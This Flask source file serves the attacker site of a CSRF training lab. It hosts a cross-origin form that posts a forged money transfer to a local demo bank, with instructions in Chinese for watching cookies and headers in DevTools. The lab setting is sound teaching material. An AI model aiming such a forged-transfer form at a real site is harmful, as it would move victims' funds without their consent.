import os
import argparse
from urllib.parse import urlsplit
from dotenv import load_dotenv
from flask import Flask, render_template, render_template_string, redirect, url_for
from waitress import create_server
from bank.demo import HACKER_ACCOUNT, DEMO_AMOUNT

load_dotenv()
app = Flask(__name__, template_folder='attacker_templates', static_folder='bank/static')
TARGET = os.getenv('ATTACK_TARGET', 'http://bank.localhost:5000').rstrip('/')
if urlsplit(TARGET).scheme not in ('http', 'https'):
    raise RuntimeError('ATTACK_TARGET must be an HTTP(S) URL')

def bank_target():
    provider = app.config.get('ENDPOINT_PROVIDER')
    return provider() if provider else TARGET

@app.get('/')
def home():
    return redirect(url_for('playground'))

@app.get('/legacy-form')
def index():
    # No JavaScript, cookie inspection, proxy, CORS bypass or session sharing.
    return render_template_string('''<!doctype html><html lang="zh-Hant"><meta charset="utf-8"><meta name="viewport" content="width=device-width"><title>CSRF 攻擊者實驗站</title>
    <body><h1>CSRF 攻擊者實驗站</h1><p>僅供授權課程與虛擬帳款。先在銀行登入，再提交此跨來源表單。</p>
    <form method="post" action="{{ target }}/transfer"><label>收款帳戶 <input name="recipient" required placeholder="貼上另一個實驗帳戶"></label>
    <label>金額 <input name="amount" type="number" value="100" min="0.01" step="0.01" required></label><button>發送偽造轉帳</button></form>
    <p>表單不含 CSRF Token，也不讀取銀行 Cookie。瀏覽器依 Cookie 規則決定是否附帶身分。</p>
    <p>DevTools → Network → Preserve log：觀察 POST /transfer 的 Cookie、Origin、Sec-Fetch-Site 與 Response。</p></body></html>''', target=bank_target())

@app.after_request
def headers(response):
    response.headers['Content-Security-Policy'] = "default-src 'none'; script-src 'self'; style-src 'self'; form-action " + bank_target() + "; frame-ancestors 'none'; base-uri 'none'"
    response.headers['Cache-Control'] = 'no-store'
    return response

@app.get('/playground')
def playground():
    return render_template('playground.html', target=bank_target(), hacker_account=HACKER_ACCOUNT, demo_amount=DEMO_AMOUNT)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--host', default='127.0.0.1')
    parser.add_argument('--port', type=int, default=5001)
    args = parser.parse_args()
    server = create_server(app, host=args.host, port=args.port)
    print(f'Attacker lab is running on port {args.port}. Open http://evil.bank.localhost:{args.port}', flush=True)
    print(f'Transfer target: {TARGET}. Keep this terminal open; press Ctrl+C to stop.', flush=True)
    try:
        server.run()
    except KeyboardInterrupt:
        pass
    finally:
        server.close()
